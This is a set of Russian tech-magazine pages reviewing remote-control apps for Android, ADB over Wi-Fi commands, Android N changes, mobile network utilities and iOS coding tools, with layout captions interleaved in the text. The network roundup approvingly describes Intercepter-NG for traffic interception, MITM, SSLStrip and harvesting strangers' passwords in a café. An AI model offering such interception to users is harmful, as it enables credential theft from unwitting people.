интернет-трафика, чтобы скачать и установить необхо-
димые утилиты. Вопрос только в том, какой именно софт
использовать и какие решения подойдут именно тебе.        INFO
В этой статье я расскажу о нескольких приложениях                                                                         Манипуляции
для управления смартом, затронув не только «обычный        с устройствами,
софт», но и решения на базе ADB.                                 традиционно для моих
                                                                                     статей, проводятся
                                                                           на Nexus 5 и Nexus 7
РЕШЕНИЯ «ИЗ КОРОБКИ»                                     2013, поэтому методы
Join от создателя многих отличных плагинов к Таскеру Жуа-     на других смартфонах
                                                                               могут отличаться.на Диаса (João Dias), по сути, повторяет возможности пла-
                                                               В связи с этим
гина и расширения AutoRemote, но в красивой оболочке.                                                                         не будут упоминаться
Тут уже не надо ничего настраивать. Поставил приложение     и фирменные утилиты
на смартфон и расширение для Chrome, и можно работать.       от производителей
                                                                                   устройств, чтобыТакже есть приложение под Windows 10. Используя Join                                                                           описать универсальные
еще с первой беты, я нахожу его очень удобным, да и автор      методы управления.
принимает советы по развитию на форуме и оперативно
правит баги и добавляет новые возможности.
   Что же умеет делать приложение? Оно объединяет комп, телефон и планшет
в одну систему. После этого можно реагировать на все уведомления от разных
устройств на любом из них. Например, ответить на СМС прямо в браузере или
с Chrome на iPad или свайпом на планшете убрать оповещение, которое при-
шло на телефон. Также доступны для взаимодействия все кнопки полученного
уведомления (Like, Reply и так далее). В ручном или автоматическом режиме
можно делиться содержимым буфера обмена со всеми устройствами. Скопи-
рованный на компе текст в любом приложении автоматически попадет в буфер
обмена на телефоне и планшете. Специальное поле расширения Write позво-
лит не только отправить большой набранный текст на устройство, но и сразу
вставить его в текстовое поле открытого на телефоне приложения. Функция
автоматической вставки есть и в настройках для буфера обмена.


                                                       Меню
                                                                 расшире-
                                                                 ния Join,
                                                                   вкладка
                                                                                    Notifica-
                                                                                        tions, раз-
                                                                  дел Write





Join встраивается в контекстное меню браузера
и позволяет отправлять и вставлять выделенный
текст на устройство, открывать на устройстве
ссылки или текущую страницу, а также автома-
том устанавливать программы при отправке
ссылки типа Download с сайта. Приложение ра-
ботает через учетную запись Google, и все пе-
редаваемые в любую стороны файлы остают-
ся в Google Drive. При затерявшемся в недрах
дома телефоне можно заставить его звонить
с любого другого устройства или компа, а так-
же определить местоположение подключенных
устройств на карте. Парой кликов мышки можно
также скачать и открыть понравившуюся фотку
на телефоне или сразу поставить ее в качестве
обоев. Скриншоты с устройства открывают-
ся в браузере после нажатия на соответству-
ющую кнопку, и на любые действия можно по-
ставить горячие клавиши. Конечно же, имеется
                                                        Полученные файлы
и поддержка команд для Таскера, но подробно                                                        и текст на устройстве
останавливаться на этом не буду. Синтаксис
не отличается от связки AutoRemote + EventGhost, описанной в 188-м номере
журнала. Выделенная страница для управления устройствами из браузера
доступна по адресу https://joinjoaomgcd.appspot.com/.
  На самом устройстве можно просмотреть всю историю с полученными фай-
лами, картинками и текстом из буфера обмена. Для особых параноиков все
сообщения можно шифровать. Видео с работой приложения смотри на кана-
ле автора. Пробный период составляет 30 дней, после чего одноразовая ак-
тивация полной версии обойдется в 4 доллара.
   AirDroid — самый продвинутый и широко известный инструмент для взаи-
модействия с телефоном. После установки программы на устройство заходим
на web.airdroid.com, логинимся удобным способом (учетки Google, Facebook,
Twitter или QR-код) и видим всю информацию об устройстве, включая память
и уровень заряда батареи.
  На экране будут отображаться все приходящие уведомления. Раздел Toolbox
справа позволит отправлять файлы на устройство, открывать URL на телефоне,
вставлять текст в буфер обмена и устанавливать приложения перетаскивани-
ем APK-файлов в окно. Есть полный доступ к журналу вызовов, СМС, контактам,
а с помощью встроенного проводника можно как смотреть все файлы устройства,
так и открывать отдельно изображения, видео или музыку. Раздел Приложения
позволит выдергивать APK установленных прог с устройства и удалять проги
с телефона. AirDroid имеет доступ к камере и может перехватывать управление
без вывода изображения на устройство. Из браузера можно начать телефонный





                                            Основное окно веб-версии программы
вызов, а при включении соответствующей настройки — отслеживать местопо-
ложение устройства. Кнопка Скриншот позволит отображать экран устройства
в реальном времени и сохранять скрины сразу на комп.
  За 2 доллара в месяц предлагают неограниченную передачу файлов, пе-
редачу папок, поддержку до шести устройств и другие плюшки. Сервис также
имеет клиент для PC, дублирующий часть функций веб-версии и добавляющий
управление телефоном с помощью мышки и клавиатуры (AirMirror). Тут русские
буквы печатаются нормально, и можно делать запись происходящего на экране.





                                             Поиск местоположения устройства
                       Установленная программа на компе, запущена вкладка AirMirror


Pushbullet объединяет несколько устройств (телефоны, планшеты, компы)
в одну экосистему и позволяет легко перебрасывать информацию, ссылки,
текст и файлы между ними в любую сторону. Есть клиенты под все платформы,
может работать из браузера. Имеет встроенное
шифрование и позволяет писать СМС с компа
и просматривать все уведомления с устройств.
Приятный бонус — возможность реагировать
на action buttons в уведомлениях. Например,
убирать уведомления с устройств (dismiss), по-
мечать прочитанным («Выполнено» для Inbox
от Google), а также отвечать на сообщения по-
пулярных мессенджеров WhatsApp,  Telegram,
Hangouts, Facebook Messenger и Line.
  Среди поддерживаемых функций есть чаты
с друзьями, использующими Pushbullet, интегра-
ция с IFTTT и чтение RSS-каналов. Также при-
ложение встраивается в проводник и позволяет
отправлять файлы с компа через контекстное
меню. Из неприятного — функции в бесплатной
версии ограниченны. Платная версия обойдется
в 4,99 доллара в месяц, но дает возможность пе-
редавать файлы объемом до одного гигабайта,                                                 Быстрые ответы Pushbullet
безлимитные ответы на сообщения (в бесплат-
ной 100 в месяц), открывает все кнопки уведомлений и позволяет копировать
текст на одном устройстве и вставлять на другом.





                                             Меню настроек Pushbullet


TeamViewer — младший брат всем известной проги. Кроме клиента для теле-
фона, с помощью которого можно управлять компом, есть TeamViewer Host,
позволяющий подключаться к телефону с компа: посмотреть загрузку CPU, до-
ступную оперативку и встроенную память устройства. Приложения с устрой-
ства можно удалять, а во встроенном двухоконном проводнике легко пере-
брасывать файлы.
                         Основная информация TeamViewer и встроенный проводник


ADB OVER WI-FI
Если ты хоть раз ставил кастомную прошивку, менял ядро и так далее, то ты
делал это через специальную утилиту ADB — Android Debug Bridge, которая
является частью Android SDK, но может быть использована отдельно. ADB —
очень интересная штуковина, позволяющая выполнять консольные коман-
ды, закачивать файлы на смартфон, делать бэкап приложений, устанавливать
и удалять софт. У нее полностью командный интерфейс, поэтому она отлично
подходит для скриптинга определенных действий со смартфоном, да и про-
сто порадует, если ты прожженный линуксоид. Проблема одна — ADB требует
подключения компа по USB, что не слишком удобно.
  Однако ADB можно использовать и по сети. Данная функция может приго-
диться не только для удаленного управления, но и когда накрылся порт USB
на телефоне, а нужно выдернуть файлы, не используя облако, или провести
другие манипуляции через ADB. Логично, что для этого необходимо, чтобы
оба устройства находились в одной Wi-Fi-сети. Итак, для начала подключаем
шнур к компу, устанавливаем на комп ADB и ищем IP-адрес телефона через
консоль одной из следующих команд (телефон должен быть подключен к той
же сети):
adb shell ifconfig

или

adb shell ip -f inet addr show wlan0

То же самое можно сделать с телефона, за-
йдя в «Настройки -> О телефоне (О планше-
те) -> Общие сведения» и найдя пункт «IP-а-
дрес». В моем случае это 192.168.137.149.
Далее введем команду, перезапускающую
ADB-сервер на телефоне в сетевой режим:

adb tcpip 5555

После этой команды отключаем шнур и под-
ключаемся к телефону, введя свой IP-адрес:

adb connect 192.168.137.149

Все. Можно работать. Например, выдернуть
с устройства определенный файл или всю                                                       Отображение IP-адреса
карту памяти.                                           на устройстве



                                                               Настройка ADB
                                                                      over Wi-Fi
                                                            и пример работы
                                                                       (начало)
                                                               Настройка ADB
                                                                       over Wi-Fi
                                                            и пример работы





Вернуть подключение через USB можно командой

adb usb

В случае изначально сломанного гнезда USB на устройстве при наличии
прав root перезапустить ADB в сетевом режиме можно прямо со смартфона.
Для этого нам понадобится любой эмулятор терминала из маркета. В нем не-
обходимо ввести следующие команды:

su
setprop service.adb.tcp.port 5555
stop adbd
start adbd

После этого можно подключаться с компа. Для возврата к USB в эмуляторе
терминала необходимо ввести
setprop service.adb.tcp.port -1
stop adbd
start adbd

Однако проще, конечно же, воспользоваться приложением WiFi ADB, которое
делает ровно то же самое.

Как включить ADB

1. Для начала активируем ADB на устройстве: «Настройки -> Об устройстве»
   -> семь тапов по «Номер сборки». Далее «Настройки -> Для разработчиков
   -> Отладка по USB».
2. Устанавливаем драйвер ADB.
3. Скачиваем ADB Kit оттуда же, распаковываем в любую папку.
4. Запускаем командную строку, переходим в папку с распакованным ADB Kit.
5. Выполняем команду adb devices и подтверждаем подключение к смартфо-
   ну на самом смартфоне.




В Linux ADB работает без всяких драйверов и обычно доступен в пакете android-
platform-tools. После его установки команду следует запускать как sudo adb.



РАСШИРЕНИЯ/ПРИЛОЖЕНИЯ ДЛЯ CHROME
ADB очень хорош как консольный инструмент доступа к устройству, одна-
ко иногда его удобнее использовать через графический интерфейс. Тако-
вых существуют десятки, если не сотни, однако самые удобные, а главное
универсальные созданы в виде расширений для всем известного браузера
Chrome.
  ADB for Chrome от знаменитого Koush (Koushik Dutta — один из разработчи-
ков Cyanogen и создатель CWM recovery) позволит запускать терминал, делать
скриншоты устройства, а также записывать видео с телефона, что может быть
полезно для видеообзоров, инструкций и так далее. Скрины открываются сра-
зу в браузере, а записанное видео можно найти в корне /sdcard.
                                                     ADB for Chrome


Vysor (Beta) от того же разработчика имеет более
богатый набор функций. Позволяет видеть экран
устройства в отдельном окне и управлять им с помо-
щью мышки, что также может быть полезно при под-
готовке видеоинструкций с захватом экрана ком-
па или для игр. Есть и минусы. Например, при вводе
с клавиатуры понимает только английский язык, по-
этому переписываться в мессенджерах или писать
СМС не получится. При первом запуске на устройство
автоматически ставится необходимая для работы
программа. В верхней части окна есть кнопки для сня-
тия скриншота, регулировки громкости, поворота
экрана устройства, управления питанием. Правда,
меню это появляется автоматически после активации
окна в течение нескольких секунд, и для повторного
вызова нужно убрать фокус с окна и активировать его
заново. Можно скопировать любой текст с телефона
                                                                     Vysor. Экран телефонаи вставить его на компе, но в обратную сторону рабо-                                                          на компе при запуске
тает опять-таки только с английскими символами.
  ChromeADB — еще одно приложение для Chrome, с помощью которого мож-
но управлять устройством, установленными приложениями и просматривать
объем доступной памяти. Для установленных на устройстве прог можно очи-
стить данные, удалить их и принудительно остановить. Также можно установить
APK, который находится на компе. На вкладке Controller можно эмулировать
нажатие кнопок питания, громкости, управления медиа, стрелок и так далее.
Если установить на устройстве дополнительно прогу ChromeADB, то на экране
появится курсор, но использовать его затруднительно, так как на комп изобра-
жение не выводится, а просто появляется MousePad с координатами курсора.
И пока не кликнешь мышкой, на самом устройстве курсор не переместится, что
вообще ставит под сомнение смысл данной функции. На вкладке App Memory
Info полезным может стать отображение потребляемых ресурсов конкретным
процессом в реальном времени.





                                                   ChromeADB. Главное окно
                    ChromeADB. Управление устройством





ChromeADB. Загрузка ресурсов телефона на примере Facebook
ВЫВОДЫ
Для истинных линуксоидов, привыкших к консоли, удобнее будет использовать
ADB over Wi-Fi, хотя и с некоторыми оговорками. Можно удалять и устанавли-
вать приложения, перетаскивать файлы в обе стороны, сделать скриншот или
запись экрана и прочее. Но почитать СМС и ответить на них, пролистать кон-
такты или найти устройство на карте уже не получится. Обычный же юзер может
выбрать для себя более привлекательную графическую оболочку для управ-
ления устройством, исходя из желательного набора возможностей, а также
размера кошелька.
MOBILE: Колонка Евгения Зобнина
 ANDROID N: ДЕСКТОП,
 ЭНЕРГОСБЕРЕЖЕНИЕ
   И ГИБРИДНЫЙ
    КОМПИЛЯТОР





                      Евгений Зобнин
                                       androidstreet.net

9 марта компания Google представила Android N — пред-
варительный выпуск седьмой версии своей операционки.
И пока все радуются многооконному режиму, новой панели
быстрых настроек и развитым уведомлениям, на которые
можно отвечать без запуска приложения, я бы хотел сосре-
доточиться на действительно важных новшествах, которые
делают Android лучше как систему, а именно: улучшениях
в Doze, JIT/AOT-компиляторе, новом API тайлов и движении
Android на десктопы.
РЕЖИМ FREEFORM
В октябре прошлого года Google заявила, что собирается слить Android
и Chrome OS в одно целое. Тогда еще было непонятно, что конкретно они име-
ют в виду, однако высказывались предположения, что компания просто ин-
тегрирует куски Chrome OS в Android и заставит его работать на десктопах.
Что ж, похоже, это оказалось правдой, так как в Android N действительно есть
не только режим разделения экрана между двумя приложениями, но и так на-
зываемый режим freeform, который позволяет запускать приложения в плава-
ющих окнах точно так же, как это реализовано в Remix OS.





  Режим freeform


Объяснить наличие данного режима ничем иным, как желанием перене-
сти систему на десктопы, нельзя: для планшетов хватит и режима разделе-
ния экрана, а на смартфонах не нужен ни тот ни другой. Десктопное будущее
также косвенно подтверждается изменениями в API. Например, теперь есть
выделенные кейкоды для копирования, вырезания и вставки, а также колбэк
onProvideKeyboardShortcuts() для активити. Последний вызывается в ответ
на ту или иную заданную программистом клавиатурную комбинацию. Также
появился API для изменения курсора (PointerIcon) при наведении на элементы
интерфейса (View).
  Все это говорит в пользу того, что вскоре мы действительно увидим Android
если не на десктопах, то уж точно на хромбуках и устройствах класса «транс-
формер»: подключил клавиатуру — получил классический многооконный
интерфейс, отключил — у тебя стандартный Android. А можно пойти дальше
и представить себе следующую ситуацию: въезжаешь в гостиницу, подключа-
ешь свой смартфон по HDMI-кабелю к телевизору и получаешь полноценный
многооконный рабочий стол (вместо стандартного Android UI, как сейчас). Не-
плохо, не правда ли?

AOT/JIT-КОМПИЛЯТОР И СКОРОСТЬ УСТАНОВКИ СОФТА
К релизу Android 5.0 Google решила окончательно отказаться от JIT-компиля-
ции в пользу AOT-компиляции приложений. Это значит, что если в прошлых
версиях Android приложения работали под управлением виртуальной маши-
ны (Dalvik), которая транслировала байт-код приложения в машинные инструк-
ции прямо по ходу его исполнения (JIT, just-in-time), то в Android 5.0 трансляция
байт-кода в машинный код происходила один раз на этапе установки приложе-
ния (AOT — ahead-of-time).
   Однако на самом деле JIT-компилятор никуда не делся и продолжал при-
меняться для некоторых участков кода (в том числе самого Android), которые
использовали кодогенерацию, а потому не могли быть переведены в машин-
ные инструкции заблаговременно. Этот JIT-компилятор было решено задей-
ствовать в Android 7.0 с целью ускорения установки приложения и первичной
загрузки после обновления: AOT-компилятор приводил к заметным задерж-
кам в обоих случаях.
   Так что Android 7.0 теперь действует иначе, чем Android 5.0+. Вместо того что-
бы запускать AOT-компиляцию каждого приложения на этапе установки, он за-
пускает приложение под управлением виртуальной машины, используя JIT-ком-
пилятор (почти так же, как в Android < 5.0), но следит за тем, какие участки кода
приложения выполняются чаще всего. Затем эта информация используется
для AOT-компиляции данных участков кода. Последняя операция выполняется
только во время бездействия смартфона, находящегося на зарядке.
   Говоря простыми словами, Google сплавила два совершенно различных
подхода и заставила два компилятора работать сообща. Плюсами такой ин-
новации являются:
•  более эффективная компиляция — при реальном запуске приложения ком-
   пилятор имеет возможность узнать о его работе гораздо больше, чем вы-
   полняя статический анализ, и, как следствие, применить более подходя-
  щие методы оптимизации для каждой ситуации;
•  сохранение оперативной и постоянной памяти — байт-код компактнее ма-
   шинного кода, а если выполнять AOT-компиляцию только отдельных участков
   приложения и не выполнять компиляцию приложений, которыми юзер не поль-
   зуется, можно существенно сэкономить пространство NAND-памяти;
•  резкое увеличение скорости установки и первой загрузки после обновле-
   ния системы — нет AOT-компиляции, нет задержки.

НОВЫЙ, УЛУЧШЕННЫЙ DOZE
В Android 6.0 появился режим энергосбережения Doze, работающий по прин-
ципу «если смартфон долго не используется, отрубаем интернет и запрещаем
приложениям будить девайс». На самом деле все несколько сложнее (во всех
подробностях я описал его в статье «Дозируй батарею правильно!»), но суть
именно такая. Ты не используешь телефон — он уходит в глубокий сон для со-
хранения батареи.
   Doze — прекрасная технология, однако изначально в нее была заложена
одна очень спорная особенность, за которую Google нередко критиковали: Doze
учитывает не только время бездействия устройства, но и время его нахождения
в покое. Другими словами, если постоянно перемещать смартфон (нести в сум-
ке, например), он никогда не уйдет в Doze, пользуешься ты им или нет.
  В Android 7.0 Google исправила эту проблему, и теперь смартфон перехо-
дит в режим Doze независимо от того, перемещается ли он.





  Стадии Doze
ЧТО ЕЩЕ?
•  OpenJDK — Android теперь использует Java-библиотеки OpenJDK, благо-
   даря чему появилась полноценная поддержка языка Java 8.
•  Quick Settings Tile API — приложения теперь могут добавлять собственные
   тайлы в панель быстрых настроек (к слову сказать, такая функциональность
   уже есть в CyanogenMod).
•  Project Svelte — продолжение разработки средств для создания бо-
   лее эффективных и не жадных до ресурсов приложений (JobScheduler
   и GcmNetworkManager).
•  Data Saver — новый сервис, который автоматически активируется, когда
   проплаченный пакет трафика подходит к концу, и отключает фоновую пере-
   дачу данных, ограничивая явную.
•  Блокиратор номеров — ожидаемая с самых первых версий Android функ-
   ция.
•  OpenGL ES 3.2 — поддержки Vulkan пока, к сожалению, нет.
•  Call screening — сторонние звонилки теперь могут показывать собствен-
  ный экран входящего звонка.
•  Multi-locale — теперь Android позволяет использовать сразу два системных
   языка (браузер больше не будет предлагать тебе перевод на английский,
   если ты его знаешь!).
•  Always on VPN — теперь система может гарантировать, что трафик не утека-
    ет.
•  Direct boot — зашифрованный смартфон теперь сохраняет базовую функ-
циональность, даже если не введен PIN-код для расшифровки.

ВЫВОДЫ
С каждым новым релизом Google вносит в Android не только видимые юзе-
ру изменения, но и массу внутренних улучшений, что, конечно же, не может
не радовать. Какие-то из них имеют спорный характер (новый Doze или запрос
полномочий во время работы в Android 6.0), другие, наоборот, важный шаг
в правильном направлении (JIT/AOT-компиляция). Как бы там ни было, Google
постоянно экспериментирует, и за всем этим очень интересно наблюдать.
MOBILE



ВЫПУСК #18.
СЕТЕВЫЕ ИНСТРУМЕНТЫ
КАРМАННЫЙ                     Сегодня в выпуске:
                     выясняем текущую сетевую
                      конфигурацию, пингуем
                      хосты и скрыто сканируем
                       порты, включаем компСОФТ
                     по сети, определяем,
                       какие операционки
                       есть в локальной сети,
                     перехватываем трафик
                     и вклиниваемся в чужие
                       сессии.
IP Tools
Платформа: Android 2.3+
Цена: бесплатно

IP TOOLS
IP Tools — это набор стандартных сетевых
инструментов, которые можно найти в лю-
бой настольной ОС: ping, whois, traceroute,
dig. Также в приложении есть встроенный
простенький сканер портов и IP-калькуля-
тор. Главный экран приложения — всевоз-
можная информация о текущих сетевых
настройках и подключении к сети, в част-
ности приложение позволяет узнать свой
внешний IP-адрес, уровень сигнала, ме-
стоположение провайдера и просмотреть
другие настройки соединения.
   Доступна  функция  Wake  on  LAN
для включения соответствующим обра-
зом настроенного ПК по сети, конвертер
IP в имя хоста, возможность просмотра
лога соединений. В общем, все самое не-
обходимое, в красивой упаковке без из-
лишков. 99% функций приложения доступ-
ны бесплатно.
Fing
Платформа: Android 2.3+
Цена: бесплатно

FING
Схожий по функциональности с IP Tools
инструмент, заточенный на анализ локаль-
ных сетей. После запуска Fing сканирует
сеть на наличие хостов и выводит на экран
список их адресов вместе с сопутствую-
щей информацией, такой как MAC-адрес
и имя хоста. Тап по любому из них откро-
ет экран дополнительных сведений, на ко-
тором есть инструменты для выполнения
пинга, скана портов, traceroute и Wake on
LAN.
   Выполнить скан портов, ping, traceroute
и DNS Lookup можно и для произвольных
сетевых хостов, правда эта функциональ-
ность почему-то находится в настройках.
Также стоит отметить, что Fing сохраня-
ет информацию обо всех исследованных
сетях, так что к анализу можно вернуться
и позже. Более того, он позволяет отгру-
жать эту информацию в облако, так что
получить к ней доступ можно отовсюду
и с любого смартфона.
Network Mapper
Платформа: Android 4.0+
Цена: бесплатно

NETWORK MAPPER
А это уже графическая обертка к широ-
ко известному сканеру портов Nmap. По-
следний известен как самый продвинутый
среди себе подобных, способный выпол-
нять сканирование всеми возможными
способами, включая скрытые, определять
тип ОС и версии висящих на портах сер-
висов. Один из ключевых инструментов
исследователя сети.
   Что касается Network Mapper, то оберт-
ка довольно проста, можно даже сказать
примитивна. Все, что можно сделать, —
это выбрать тип сканирования (от про-
стейшего Regular до Intense, включающего
в себя также определение ОС, сервисов
и другой информации) и вбить IP-адрес.
Далее вывод Nmap посыплется на экран,
и останется только дождаться заверше-
ния операции и провести анализ.
  К слову  сказать, приложение никак
не парсит и не изменяет сам вывод, так что
он будет точно таким же, как на настоль-
ных ОС. И это хорошо.
Intercepter-NG
Платформа: Android 2.1+
Цена: бесплатно

INTERCEPTER-NG
Тяжелая артиллерия. Об  Intercepter-NG
можно написать не одну статью, поэтому
не буду вдаваться в детали, а просто ска-
жу, что это одно из самых мощных прило-
жений для сканирования сетей, перехвата
трафика, его изменения в реальном вре-
мени и выполнения MITM-атак. В умелых
руках Intercepter-NG превращается в мощ-
нейший инструмент, позволяющий зайти
в кафе и уйти с пачкой паролей и личных
данных, заодно узнав, сколько в помеще-
нии пользователей iPhone 6s, а кто поль-
зуется древним Galaxy S3.
   Android-версия инструмента неказиста
на вид и во многом уступает настольной,
однако и в ней есть масса возможностей,
включая скан локальной сети, перехват
локального трафика, кукисов, файлов, пе-
редаваемых в открытом виде, можно вы-
полнять SSLStrip, DNS-спуфинг, сохранять
сессию в pcap для последующего анализа
на ПК и многое другое. В общем, must have
инструмент любого исследователя, к тому
же абсолютно бесплатный.
MOBILE





                                                                     Михаил Филоненко
                                                                                            mfilonen2@gmail.comКОДИНГ





ПРОГРАММИРУЕМНА ХОДУ
И АДМИНИСТРИРУЕМ,
ИСПОЛЬЗУЯ IOS
Вероятно, еще после покупки своего первого мобиль-
ного гаджета от Apple ты задавался вопросом, как вы-
жать из него нечто большее, чем прослушивание музыки
и чтение книг. Да, здесь тонны софта на все случаи жизни,
но как насчет того, чтобы сделать чекаут своего приложе-
ния из GitHub, внести в него правки и затем залить на сер-
вер по SSH? А ведь это вполне возможно сделать, если
знать как.


В этой статье представлена подборка инструментов для программистов и ад-
министраторов, которым, по той или иной причине, необходимо работать в от-
сутствие доступа к десктопу. Разумеется, данные программы не так хороши,
как их «настольные» аналоги, однако и их возможности смогут покрыть не-
малую часть потребностей людей, занимающихся созданием программ или
только начинающих это делать.

РЕДАКТОРЫ КОДА
Самый простой инструмент программиста — редактор кода. Таких программ
десятки для очень многих платформ, не является исключением и iOS. Общие
требования к подобной утилите — лаконичность, поддержка большого коли-
чества языков, интеграция с облачными сервисами. В iOS важным становится
еще один параметр — поскольку клавиатура не приспособлена для набора
кода, необходима либо другая клавиатура, либо возможность интегрировать
в существующую дополнительные кнопки с наиболее часто употребляемы-
ми спецсимволами. Рассмотрим самые популярные редакторы кода, которые
удовлетворяют этим требованиям, а также обладают своими уникальными
возможностями.

Textastic
Textastic, вероятно, самый популярный и многофункциональный редактор.
Впрочем, разработчики знают цену своему творению — в App Store програм-
му можно найти за 10 долларов, что по меркам данного магазина немало.
Конечно, при наличии jailbreak на аппарате можно скачать редактор в одном
из многочисленных хранилищ пиратского софта, но отсутствие эксплоитов
для последних версий iOS значительно усложняет бесплатное приобретение
утилиты.
   Однако, рассмотрев возможности Textastic, опытный программист, скорее
всего, сделает вывод, что заплатить за эту программу все же стоит. Достаточ-
но взглянуть на возможности утилиты:
•  Поддержка огромного количества языков программирования с соответ-
   ствующей подсветкой синтаксиса.
•  Блоки спецсимволов над клавиатурой.
•  Интеграция с iCloud Drive и богатые возможности распространения полу-
   ченных результатов.
•  Возможность видеть и редактировать файлы на удаленном FTP/SFTP-сер-
   вере, в облачном хранилище Dropbox или используя технологию WebDAV.
•  Создание папок, файлов и изображений, которые будут отображаться
   в меню слева.
•  Поддерживается произвольный уровень вложенности. При создании фай-
   ла можно выбрать его кодировку.
•  Менеджер файлов.





                                                Интерфейс программы Textastic

В качестве бонуса можно выделить гибкие настройки оформления. Есть воз-
можность выбрать шрифт и его размер, тему и цвет интерфейса, включить ав-
токоррекцию, защитить программу паролем или отрегулировать межстрочные
интервалы и отступы. Другая фишка — поддержка 3D Touch в новейших моде-
лях iPhone, многозадачности в планшетах и оптимизации под тринадцатидюй-
мовый iPad Pro.
  В общем, Textastic действительно универсальный редактор, однако и у него
есть свои недостатки. Например, нет интеграции с GitHub, да и цена програм-
мы не радует. Потому стоит обратить внимание и на альтернативы этому ре-
шению.

Koder
Один из ближайших конкурентов Textastic — менее дорогая, но практически
не уступающая по функциональности утилита Koder. Здесь можно добавить ка-
стомные клавиши на верхнюю панель клавиатуры, подключиться к SSH-серве-
ру. Настройки оформления, передача данных по FTP, защита файлов паролем
и поддержка не меньшего, чем в Textastic, количества языков программиро-
вания — все это также присутствует в данном приложении. Еще есть клавиша





                                                   Интерфейс программы Koder
в верхней панели для удобного перемещения по коду, облач-
ная синхронизация, гибкий поисковый движок с возможно-
стью замены, настройка прав доступа на серверах, превью
HTML-файла в окне браузера и поддержка iTunes File Sharing.
Из удобных особенностей — поддержка нескольких вкладок
при редактировании файлов. Так что данный редактор от-    WWW
нюдь не хуже Textastic, мало того, он обладает многими не-
                                                                                                     Textastic
большими, но оттого не менее приятными преимуществами.
И это при значительно меньшей цене.                                      Koder
   Существует еще множество других решений — клиент он-
                                                                               codeanywhereлайн-сервиса codeanywhere,  iEditor, Code Master и прочие.
Однако они серьезно уступают по функциональности пер-             iEditor
вым двум программам, являющимся, безусловно, лидерами
                                                                         Code Masterданного сегмента утилит, потому рассматривать их отдельно
не будем.                                                                         CppCode

                                                                                      PythonИНТЕРПРЕТАТОРЫ И КОМПИЛЯТОРЫ
Мало просто написать код, его надо скомпилировать, запу-                                                                                             JavaScript
стить и отладить. Для этого также есть несколько решений        Anywhere
для отдельных языков.
                                                                                           CoffeeScript At   Программистам, использующим C и C++, вероятно, при-                                                                            Once
годится лаконичная IDE CppCode. Здесь имеется небольшой
менеджер файлов без поддержки вложенности, собственно          Dash
редактор с подсветкой синтаксиса, простенький отладчик
                                                                                   Working Copy
и компилятор. В верхней панели расположены шорткаты та-
ким же образом, как это реализовано в Textastic, а еще здесь          iOctocat
присутствует кнопка для быстрой навигации по коду. Аске-
                                                                          CodeHubтичные параметры программы расположены в нативном при-
ложении «Настройки». Важная особенность — есть немало        QueryDB
примеров уже готового кода, что будет полезно для начина-
                                                                                              Navicatющих программистов. Жаль только, русский в данной утили-
те не поддерживается.                                                                                   Prompt
   У CppCode есть и платная Premium-версия (сама же ути-
                                                                                                iNetToolsлита распространяется бесплатно). Однако и стандартных
возможностей будет вполне достаточно для быстрого про-                                                                                                   IP Network
граммирования. В общем, IDE достаточно простая, но ста-         Scanner
бильная и быстрая, а это важно для подобных утилит.
                                                                             Codea
                           Настройки CppCode расположены в нативном приложении


  Свое решение есть и для Python. Точнее, интерпретаторов для него великое
множество, они выпущены отдельно для каждой версии языка. Простая на вид
программа содержит немало функций. В левом окне можно писать сам скрипт
или вводить терминальные команды. В правом окне будет отображаться ре-
зультат исполнения скрипта. Клавиатура, как и в других редакторах, оснащена
верхней панелью, правда не такой функциональной, зато немного более по-
нятной по сравнению с тем же CppCode. Среди преимуществ серии прочих
интерпретаторов — большой набор документации, которую можно загружать
непосредственно в саму программу и использовать в режиме офлайн. Также
имеется набор скриптов.
  Для iOS есть и интерпретатор JavaScript (а точнее, интерфейс к встроенному
движку). Называется он JavaScript Anywhere. Организация рабочего простран-
ства привычная: слева панель документов, справа — панель для редактирова-
ния кода. Собственно рабочая часть дисплея имеет три вкладки — HTML, CSS
и JS. Предусмотрен менеджер загрузки изображений и интеграция с Dropbox.
Однако панель спецсимволов отсутствует.
  Последним рассмотрим компилятор для  CoffeeScript под названием
CoffeeScript At Once. В целом он мало чем отличается от утилиты для JS. Практи-
чески тот же интерфейс, набор настроек и опций. К трем верхним кнопкам в ра-
бочей области добавлены еще две — EXT и RUN. В последней отображается
уже скомпилированный код. Присутствует панель спецсимволов, чуть больше
набор настроек отображения, есть интеграция с GitHub. Вот, собственно, и все
отличия из тех, которые пользователь сможет заметить «с первого взгляда».

СПРАВОЧНИКИ
Какими бы глубокими ни были твои познания в программировании, тебе всег-
да потребуется что-либо уточнить или узнать. Конечно, нужную информацию
можно найти в Сети, но намного удобнее будет воспользоваться офлайн-спра-
вочником, где все сведения систематизированы и представлены в удобном
виде. Именно таким браузером документации является утилита Dash. Данная
программа предоставляет структурированную информацию по самым раз-





                                           Введение в справочник по AppleScript
личным языкам и фреймворкам. Здесь и AppleScript, и C++, и .NET. Для того
чтобы просмотреть справочник, необходимо загрузить файлы, а вся докумен-
тация займет немало места на аппарате. Тем не менее для программиста лю-
бого уровня эта утилита исключительно полезна, а если учесть возможность
загружать собственные наборы справочников, и вовсе переходит в категорию
must have.
  Программа абсолютно бесплатна, в ней нет встроенных покупок. Одно-
именное приложение, правда с намного большей функциональностью, есть
и для OS X.

GIT, GITHUB И MYSQL
Хотя iOS-устройства все же не могут считаться прекрасным инструментом
для работы программиста или администратора, на них имеется клиент попу-
лярной системы контроля версий Git. Он называется Working Copy и распола-
гает большими возможностями.
  Программа позволяет найти требуемый репозиторий GitHub или BitBucket,
клонировать его на устройство и изменить его файлы. Само изменение кода
осуществляется через сторонние редакторы (те же Textastic или Koder). Дан-
ная возможность реализована благодаря появившейся в iOS 9 технологии
Document Picker, позволяющей редактировать один и тот же файл при помощи
различных программ от сторонних разработчиков. В самой программе тоже
есть редактор, который вызывается через меню Action при свайпе вправо
по объекту.
   Утилита регистрирует изменения в файлах, их можно просмотреть. Это ка-
сается и текстовых документов, и изображений. После редактирования изме-
нения можно запушить на сервер. Для каждого репозитория утилита создает
интерактивный график изменений, где их можно отследить и затем рассмо-
треть более подробно.
  Для iPhone и iPad есть и клиент GitHub — самого популярного сервиса
для коллективной разработки проектов. Бесплатный iOctocat поддерживает
некоторые функции ресурса. В основном, конечно, это просмотрщик и про-
грамма для общения разработчиков. При помощи данной программы (в бес-
платной версии, есть еще Basic и Pro) нельзя создать репозиторий или форк
существующего проекта. Отсутствуют также функции скачивания всего проек-
та и многие другие. Вероятно, они есть в платной версии, равно как и доступ
к приватным репозиториям, за открытие которого разработчики данной про-
граммы взимают дополнительную плату. Еще в Pro-версии доступны Push-уве-
домления для более удобной переписки.
                                                         Pro- и Basic-версии iOctocat


